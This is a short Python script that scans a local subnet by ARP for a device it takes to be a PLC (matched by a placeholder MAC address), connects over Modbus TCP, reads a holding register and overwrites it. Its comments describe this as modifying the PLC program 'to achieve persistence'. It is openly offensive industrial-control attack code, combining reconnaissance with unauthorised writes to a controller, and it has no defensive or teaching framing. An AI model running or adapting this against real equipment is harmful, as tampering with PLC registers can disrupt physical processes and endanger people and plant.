import socket
import struct
import time
from scapy.all import ARP, Ether, srp
from pymodbus.client.sync import ModbusTcpClient
from pysnmp.hlapi import *

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Define the IP range to scan
    ip_range = "192.168.1.0/24"
    
    # Create an ARP request packet
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    
    # Send the packet and capture the response
    result = srp(packet, timeout=2, verbose=False)[0]
    
    # Parse the response
    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    
    # Filter out the PLC based on MAC address or other criteria
    plc_ip = None
    for device in devices:
        # Example: Assuming the PLC has a specific MAC address
        if device['mac'] == '00:11:22:33:44:55':
            plc_ip = device['ip']
            break
    
    return plc_ip

# Function to connect to the PLC and modify the program
def modify_plc_program(plc_ip):
    # Connect to the PLC
    client = ModbusTcpClient(plc_ip)
    if not client.connect():
        print(f"Failed to connect to PLC at {plc_ip}")
        return
    
    print(f"Connected to PLC at {plc_ip}")
    
    # Example: Modify a specific register to achieve persistence
    # This is a simplified example. In a real scenario, you would need to know the specific registers and logic to modify.
    try:
        # Read the current value of a register
        result = client.read_holding_registers(address=0x00, count=1, unit=1)
        if result.isError():
            print("Failed to read register")
            return
        
        current_value = result.registers[0]
        print(f"Current value of register 0x00: {current_value}")
        
        # Modify the register value
        new_value = current_value + 1  # Example modification
        result = client.write_register(address=0x00, value=new_value, unit=1)
        if result.isError():
            print("Failed to write to register")
            return
        
        print(f"Modified register 0x00 to {new_value}")
    finally:
        client.close()

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip is None:
        print("PLC not found on the network")
        return
    
    # Modify the PLC program
    modify_plc_program(plc_ip)

if __name__ == "__main__":
    main()